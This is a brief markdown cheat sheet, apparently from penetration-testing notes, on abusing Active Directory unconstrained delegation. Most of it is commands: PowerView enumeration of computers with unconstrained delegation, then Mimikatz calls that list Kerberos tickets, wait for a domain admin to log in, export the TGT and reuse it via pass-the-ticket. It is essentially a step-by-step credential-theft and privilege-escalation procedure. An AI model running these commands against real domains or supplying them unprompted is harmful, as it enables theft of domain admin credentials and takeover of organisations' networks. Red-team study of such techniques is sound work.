# 🟢 Unconstrained Delegation

### **Discover domain computers that have unconstrained delegation**

Domain Controllers always show up, ignore them

```
 . .\PowerView_dev.ps1
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```

### **Check if any DA tokens are available on the unconstrained machine**

Wait for a domain admin to log in while checking for tokens

```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

### **Export the TGT ticket**

```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### **Reuse the TGT ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```
